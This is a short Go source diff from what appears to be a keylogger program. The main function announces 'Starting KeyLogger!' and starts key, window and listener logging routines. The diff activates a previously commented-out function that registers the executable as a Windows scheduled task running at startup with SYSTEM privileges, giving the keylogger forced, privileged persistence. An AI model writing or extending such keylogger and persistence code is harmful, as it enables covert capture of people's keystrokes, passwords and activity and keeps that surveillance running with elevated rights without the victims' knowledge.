@@ -3,6 +3,7 @@ package main
 import (
 	"log"
 	"math"
+	"os/exec"
 	"strconv"
 	"syscall"
 	"time"
@@ -368,20 +369,26 @@ func keyLoggerListener() {
 	}
 }
 
-// func addScheduler() {
-// 	cmd, err := exec.Command(
-// 		"schtasks",
-// 		"/create",
-// 		"/sc", "ONSTART",
-// 		"/tn", "\"My Task\"",
-// 		"/tr", "\"D:\\Projects\\go-projects\\bin\\amigo.exe\"",
-// 		"/ru", "SYSTEM",
-// 	).Output()
-// }
+func addScheduler() {
+	cmd, err := exec.Command(
+		"schtasks",
+		"/create",
+		"/sc", "ONSTART",
+		"/tn", "My Task",
+		"/f",
+		"/tr", "D:\\Projects\\go-projects\\bin\\amigo.exe",
+		"/ru", "SYSTEM",
+	).Output()
+
+	if err != nil {
+		log.Fatalf("addScheduler -> %v", err)
+	}
+	log.Println(string(cmd))
+}
 
 func main() {
 	log.Println("Starting KeyLogger!")
-	// addScheduler()
+	addScheduler()
 	go keyLogger()
 	go windowLogger()
 	go keyLoggerListener()
